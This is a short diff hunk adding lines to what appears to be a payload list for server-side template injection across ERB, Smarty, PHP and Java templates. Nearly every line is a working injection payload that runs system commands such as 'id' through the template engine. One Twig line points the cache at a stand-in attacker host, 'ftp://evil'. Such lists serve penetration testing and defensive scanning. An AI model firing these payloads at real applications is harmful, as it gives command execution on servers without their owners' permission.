@@ -31,6 +31,8 @@ ${''.getClass().forName('java.lang.Runtime')}
 # === ERB / Smarty / PHP ===
 <%= system('id') %>
 <%= IO.popen('id').read %>
+<% system('id') %>
+<% 7*7 %>
 {php}system('id');{/php}
 {system('id')}
 {{_self.env.setCache("ftp://evil")}}
